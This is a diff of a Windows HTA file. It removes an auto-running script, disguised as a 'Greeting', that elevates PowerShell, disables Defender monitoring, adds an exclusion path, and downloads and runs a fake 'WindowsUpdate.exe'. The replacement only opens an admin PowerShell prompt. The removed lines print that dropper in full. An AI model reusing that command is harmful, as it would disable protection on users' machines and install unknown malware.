@@ -1,20 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Greeting</title>
-<HTA:APPLICATION ID="objHTA" APPLICATIONNAME="Greeting" WINDOWSTATE="normal" SHOWINTASKBAR="yes" SINGLEINSTANCE="yes">
+<title>Admin PowerShell Launcher</title>
+<HTA:APPLICATION ID="launcher" APPLICATIONNAME="Admin PS" WINDOWSTATE="normal" SHOWINTASKBAR="yes" SINGLEINSTANCE="yes">
 </head>
 <script language="JavaScript">
-    function RunCommand() {
+    function openPowerShell() {
         var shell = new ActiveXObject("Shell.Application");
-        // FIXED: Correctly escaped double quotes inside the PowerShell command string
-        var cmd = "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath $env:TEMP; Invoke-WebRequest -Uri 'https://xmosuaughwjenidmauri.supabase.co/storage/v1/object/public/files/WindowsUpdate.exe' -OutFile $env:TEMP\\WindowsUpdate.exe; Start-Process $env:TEMP\\WindowsUpdate.exe\"";
-        shell.ShellExecute("powershell.exe", cmd, "", "runas", 1);
+        // Launches PowerShell as admin, no additional commands
+        shell.ShellExecute("powershell.exe", "", "", "runas", 1);
         window.close();
     }
-    window.onload = RunCommand;
+    window.onload = openPowerShell;
 </script>
-<body style="background:#f0f0f0; text-align:center; padding:50px;">
-    <h2>Starting...</h2>
+<body style="background:#e0e0e0; text-align:center; padding:50px;">
+    <h2>Launching PowerShell as Administrator...</h2>
 </body>
 </html>
